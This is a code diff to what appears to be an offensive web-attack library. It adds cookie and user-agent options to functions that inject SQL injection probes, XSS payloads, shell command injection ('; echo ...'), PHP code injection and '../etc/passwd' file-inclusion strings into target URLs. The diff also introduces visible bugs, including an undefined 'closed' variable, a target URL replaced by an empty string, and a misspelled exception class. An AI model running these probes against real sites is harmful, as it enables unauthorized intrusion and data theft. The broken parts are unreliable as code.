@@ -3,7 +3,7 @@ import bs4
 from bs4 import BeautifulSoup
 from bane.payloads import *
 from bane.pager import inputs
-def sqlieb(u,logs=True,returning=False,timeout=10,proxy=None):
+def sqlieb(u,logs=True,user_agent=None,returning=False,timeout=10,proxy=None,cookie=None):
  '''
    this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
    check the response body for any SQL syntax errors.
@@ -30,11 +30,19 @@ def sqlieb(u,logs=True,returning=False,timeout=10,proxy=None):
  s=False
  if proxy:
   proxy={'http':'http://'+proxy}
+ if user_agent:
+  us=user_agent
+ else:
+  us=random.choice(ua)
+ if cookie:
+   hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  if logs==True:
   print("[*]Error Based SQL Injection test")
  try:
   u+="'"
-  rp= requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout)
   r=rp.text
   if (('SQL command not properly ended' in r) or ('Query failed: ERROR: syntax error at or near' in r) or ('Unclosed quotation mark before the character string' in r) or ("You have an error in your SQL syntax" in r) or ("quoted string not properly terminated" in r) or ("mysql_fetch_array(): supplied argument is not a valid MySQL result resource in"in r)):
    s=True
@@ -47,7 +55,7 @@ def sqlieb(u,logs=True,returning=False,timeout=10,proxy=None):
    print("[+]Vulnerable!!!")
  if returning==True:
   return s
-def sqlibb(u,logs=True,returning=False,timeout=10,proxy=None):
+def sqlibb(u,logs=True,returning=False,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
    this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding boolean opertations to the link
    and check the response body for any change.
@@ -74,11 +82,19 @@ def sqlibb(u,logs=True,returning=False,timeout=10,proxy=None):
  if proxy:
   proxy={'http':'http://'+proxy}
  s=False
+ if user_agent:
+  us=user_agent
+ else:
+  us=random.choice(ua)
+ if cookie:
+   hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  try:
   if logs==True:
    print("[*]Boolean Based SQL Injection test")
-  r=requests.get(u+"+and+1=2",proxies=proxy,timeout=timeout)
-  q=requests.get(u+"+and+1=1",proxies=proxy,timeout=timeout)
+  r=requests.get(u+" and 1=2",headers=hea,proxies=proxy,timeout=timeout)
+  q=requests.get(u+" and 1=1",headers=hea,proxies=proxy,timeout=timeout)
   r1=r.text
   q1=q.text
   if ((r.status_code==200)and(q.status_code==200)):
@@ -93,7 +109,7 @@ def sqlibb(u,logs=True,returning=False,timeout=10,proxy=None):
    print("[+]Vulnerable!!!")
  if returning==True:
   return s
-def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None):
+def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None,user_agent=None,cookie=None):
  '''
    this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding a delay statement at the end
    of the line and check the delay of the response.
@@ -120,6 +136,14 @@ def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None
 '''
  if proxy:
   proxy={'http':'http://'+proxy}
+ if user_agent:
+  us=user_agent
+ else:
+  us=random.choice(ua)
+ if cookie:
+   hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  s=False
  if db.lower()=="mysql":
   sle="-SLEEP({})".format(delay)
@@ -133,7 +157,7 @@ def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None
   if logs==True:
    print("[*]Time Based SQL Injection test")
   t=time.time()
-  r=requests.get(u+sle,proxies=proxy,timeout=timeout)
+  r=requests.get(u+sle,headers=hea,proxies=proxy,timeout=timeout)
   if ((time.time()-t>=delay)and (r.status_code==200)):
     s=True
  except:
@@ -145,7 +169,7 @@ def sqlitb(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,proxy=None
    print("[+]Vulnerable!!!")
  if returning==True:
   return s
-def xssget(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
+def xssget(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
   '''
    this function is for xss test with GET requests.
 
@@ -161,6 +185,10 @@ def xssget(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
    us=user_agent
   else:
    us=random.choice(ua)
+  if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+  else:
+   hea={'User-Agent': us}
   if proxy:
    proxy={'http':'http://'+proxy}
   for x in pl:
@@ -170,13 +198,13 @@ def xssget(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
    d.update(extra)
   d.update(pl)
   try:
-     c=requests.get(u, params= pl,headers = {'User-Agent': us},proxies=proxy,timeout=timeout).text
+     c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout).text
      if  xp in c:
       return True
   except Exception as e:
    pass
   return False
-def xsspost(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
+def xsspost(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
   '''
    this function is for xss test with POST requests.
 
@@ -192,6 +220,10 @@ def xsspost(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
    us=user_agent
   else:
    us=random.choice(ua)
+  if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+  else:
+   hea={'User-Agent': us}
   if proxy:
    proxy={'http':'http://'+proxy}
   for x in pl:
@@ -201,13 +233,13 @@ def xsspost(u,pl,user_agent=None,extra=None,timeout=10,proxy=None):
    d.update(extra)
   d.update(pl)
   try:
-     c=requests.post(u, data= d,headers = {'User-Agent': us},proxies=proxy,timeout=timeout ).text
+     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout ).text
      if xp in c:
       return True 
   except Exception as e:
    pass
   return False
-def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,proxy=None,proxies=None,timeout=10):
+def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
   '''
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -239,7 +271,7 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
   if logs==True:
    print("Getting parameters...")
   hu=True
-  l1=inputs(u,proxy=proxy,timeout=timeout,value=True)
+  l1=inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
   if len(l1)==0:
    if logs==True:
     print("No parameters were found!!!")
@@ -276,7 +308,7 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
       if fresh==True:
        extr=[]
        user=random.choice(ua)
-       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True)
+       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
        for x in k:
         if (x.split(':')[1]!=''):
          extr.append(x)
@@ -289,7 +321,7 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
          a=x.split(':')[0]
          b=x.split(':')[1]
          extra.update({a:b})
-      if xssget(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout)==True:
+      if xssget(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie)==True:
          x="parameter: "+i+" method: GET=> [+]Payload was found"
       else:
        x="parameter: "+i+" method: GET=> [-]Payload was not found"
@@ -300,7 +332,7 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
       if fresh==True:
        extr=[]
        user=random.choice(ua)
-       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True)
+       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
        for x in k:
         if (x.split(':')[1]!=''):
          extr.append(x)
@@ -313,7 +345,7 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
          a=x.split(':')[0]
          b=x.split(':')[1]
          extra.update({a:b})
-      if xsspost(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout)==True:
+      if xsspost(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie)==True:
       	x="parameter: "+i+" method: POST=> [+]Payload was found"
       else:
        x="parameter: "+i+" method: POST=> [-]Payload was not found"
@@ -324,16 +356,24 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
      break
    if returning==True:
     return lst
-def execlink(u,timeout=10,proxy=None,logs=True,returning=False):
+def execlink(u,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,cookie=None):
  '''
    this function is for command execution test using a given link
 '''
  s=False
  if proxy:
   proxy={'http':'http://'+proxy}
- u+='%3Becho%20alaistestingyoursystem'
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
+ u+='; echo alaistestingyoursystem'
  try:
-  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout)
   if (r.status_code==200):
    if ("alaistestingyoursystem" in r.text):
     s=True
@@ -346,72 +386,109 @@ def execlink(u,timeout=10,proxy=None,logs=True,returning=False):
    print("[-]Not vulnerable")
  if returning==True:
   return s
-def execget(u,param='',value='',extra=None,timeout=10,proxy=None):
+def execget(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
   this function is for command execution test using a given link and GET parameter
 '''
  value+=";echo alaistestingyoursystem"
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  pl={param:value}
  if extra:
   pl.update(extra)
  try:
-  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout)
   if (r.status_code==200):
    if ("alaistestingyoursystem" in r.text):
     return True
  except:
   pass
  return False
-def execpost(u,param='',value='',extra=None,timeout=10,proxy=None):
+def execpost(u,param='',value='',extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
   this function is for command execution test using a given link and POST parameter
 '''
  if proxy:
   proxy={'http':'http://'+proxy}
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  value+=";echo alaistestingyoursystem"
  post={param:value}
  if extra:
   post.update(extra)
  try:
-  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout)
   if (r.status_code==200):
    if ("alaistestingyoursystem" in r.text):
     return True
  except exception as e:
   pass
  return False
-def phpget(u,param='',value='',end=False,extra=None,timeout=10,proxy=None):
+def phpget(u,param='',value='',end=False,extra=None,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
   this function is for PHP code execution test using a given link and GET parameter
 '''
  if proxy:
   proxy={'http':'http://'+proxy}
- value+=";echo'alawashere'"
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
+ if closed==True:
+  value+="'"
+ value+="; echo'alawashere'"
  if end==True:
   value+=";"
  pl={param:value}
  if extra:
   pl.update(extra)
  try:
-  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  r=requests.get(u,params=pl,headers = hea,proxies=proxy,timeout=timeout)
   if (r.status_code==200):
    if ("alawashere" in r.text):
     return True
  except:
   pass
  return False
-def phplink(u,end=False,timeout=10,proxy=None,logs=True,returning=False):
+def phplink(u,closed=True,end=False,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,cookie=None):
  '''
   this function is for PHP code execution test using a given link
 '''
  s=False
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
- u+="%3Becho'alawashere'"
+ u=''
+ if closed==True:
+  u+="'"
+ u+="; echo'alawashere'"
  if end==True:
-  u+="%3B"
+  u+=";"
  try:
-  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  r=requests.get(u,headers = hea,proxies=proxy,timeout=timeout)
   if (r.status_code==200):
    if ("alawashere" in r.text):
     s= True
@@ -424,33 +501,51 @@ def phplink(u,end=False,timeout=10,proxy=None,logs=True,returning=False):
    print("[-]Not vulnerable")
  if returning==True:
   return s
-def phppost(u,param='',value='',extra=None,end=False,timeout=10,proxy=None):
+def phppost(u,param='',value='',extra=None,end=False,timeout=10,proxy=None,user_agent=None,cookie=None):
  '''
   this function is for PHP code execution test using a given link and POST parameter
 '''
  if proxy:
   proxy={'http':'http://'+proxy}
- value+=";echo'alawashere'"
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
+ if closed==True:
+  value+="'"
+ value+="; echo'alawashere'"
  if end==True:
   value+=";"
  post={param:value}
  if extra:
   post.update(extra)
  try:
-  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
+  r=requests.post(u,data=post,headers = hea,proxies=proxy,timeout=timeout)
   if (r.status_code==200):
    if ("alawashere" in r.text):
     return True
  except:
   pass
  return False
-def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=None,proxies=None,timeout=10):
+def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
  '''
    this function is for FI vulnerability test using a link
 '''
  x={}
  if proxy:
   proxy={'http':'http://'+proxy}
+ if user_agent:
+   us=user_agent
+ else:
+   us=random.choice(ua)
+ if cookie:
+    hea={'User-Agent': us,'Cookie':cookie}
+ else:
+   hea={'User-Agent': us}
  s=False
  l='etc/passwd'
  if (nullbyte==True):
@@ -466,7 +561,7 @@ def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=
    try:
     if logs==True:
      print("[*]Trying:", u+l)
-    r=requests.get(u+l,proxies=proxy,timeout=timeout)
+    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout)
     if ("root:x:0:0:root:/root:/bin/bash" in r.text):
      s=True
      x= {"Status":s,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
@@ -491,7 +586,7 @@ def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy=
   try:
     if logs==True:
      print("[*]Trying:", u+l)
-    r=requests.get(u+l,proxies=proxy,timeout=timeout)
+    r=requests.get(u+l,headers=hea,proxies=proxy,timeout=timeout)
     if ("root:x:0:0:root:/root:/bin/bash" in r.text):
      s=True
      x= {"Status":s,"Nullbyte":nullbyte,'Link':r.url}
